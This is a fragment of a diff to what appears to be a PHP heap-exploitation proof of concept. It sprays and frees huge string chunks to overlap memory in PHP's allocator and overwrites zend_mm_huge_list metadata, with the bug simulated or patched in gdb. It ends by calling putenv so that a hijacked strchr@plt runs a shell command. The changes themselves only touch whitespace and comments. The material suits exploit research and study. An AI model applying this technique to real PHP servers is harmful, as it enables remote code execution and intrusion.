@@ -44,7 +44,7 @@ unset($arr[3]); 	// free huge chunk arr[3]
 //chunk arr[7] allocated in same place of chunk arr[3] and with same metadata chunk address
 $arr[7] = str_repeat('D', 4 * 1024 * 1024 - 0x1000);
 
-var_dump('');   	//simulate bug
+var_dump('');  		//simulate bug
 					//need 4 bytes heap overflow OR rewrite in gdb
 					//rewrite field "ptr" in zend_mm_huge_list metadata struct for chunk arr[7]
 
@@ -60,6 +60,6 @@ var_dump('');   	//breakpoint stop ---> we can see memory overlapped chunks
 $arr[333] = str_repeat('S', 1792 - 100 - 8);
 $arr[333 + 1] = $str. $arr[333]; 
 
-putenv('ls -lia'); // execute command via putenv
+putenv('ls -lia'); // putenv calls strchr@plt ---> execute commands
 
 ?>
